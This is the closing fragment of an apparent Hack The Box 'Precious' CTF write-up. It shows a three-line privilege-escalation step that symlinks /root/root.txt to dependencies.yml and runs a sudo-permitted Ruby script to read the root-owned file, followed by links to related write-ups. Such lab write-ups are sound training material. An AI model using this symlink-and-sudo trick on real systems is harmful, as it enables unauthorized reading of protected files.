<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># henry@precious.htb (SSH)</span></span>
<span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">cd</span><span style="color:#999999;--shiki-dark:#89DDFF"> $(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">mktemp</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -d</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">ln</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -s</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /root/root.txt</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ./dependencies.yml</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # create symlink</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">sudo</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /usr/bin/ruby</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /opt/update_dependencies.rb</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # read /root/root.txt</span></span></code></pre>  </div> <!-- related posts --> <footer> <h2 class="font-bold text-lg dark:text-white mb-6">Related Posts</h2> <section class="flex flex-col md:flex-row sm:justify-between gap-8"> <div class="flex flex-wrap gap-2"> <div class="min-h-full"> <img src="/_astro/image.QlzOxquK_12zkJG.webp" class="w-16 h-16 object-cover rounded-full  " alt="img of Broker - HTB Writeup" width="200" height="200" loading="lazy" decoding="async"> </div> <header class="flex justify-center items-center"> <a class="font-medium  hover:underline" href="/post/broker/"> Broker - HTB Writeup </a> </header> </div><div class="flex flex-wrap gap-2"> <div class="min-h-full"> <img src="/_astro/image.ZdYvWzdn_11qkpn.webp" class="w-16 h-16 object-cover rounded-full  " alt="img of Builder - HTB Writeup" width="200" height="200" loading="lazy" decoding="async"> </div> <header class="flex justify-center items-center"> <a class="font-medium  hover:underline" href="/post/builder/"> Builder - HTB Writeup </a> </header> </div><div class="flex flex-wrap gap-2"> <div class="min-h-full"> <img src="/_astro/image.R-ZwdRw5_Z1hxbOg.webp" class="w-16 h-16 object-cover rounded-full  " alt="img of Crafty - HTB Writeup" width="200" height="200" loading="lazy" decoding="async"> </div> <header class="flex justify-center items-center"> <a class="font-medium  hover:underline" href="/post/crafty/"> Crafty - HTB Writeup </a> </header> </div> </section> </footer> </article> </div>  </div> </article>  <footer class="flex justify-center items-center w-full px-16 h-28 border-t-2">
&copy; 2024 Fullaw4ke. All rights reserved.
</footer> </main>    </body> </html> 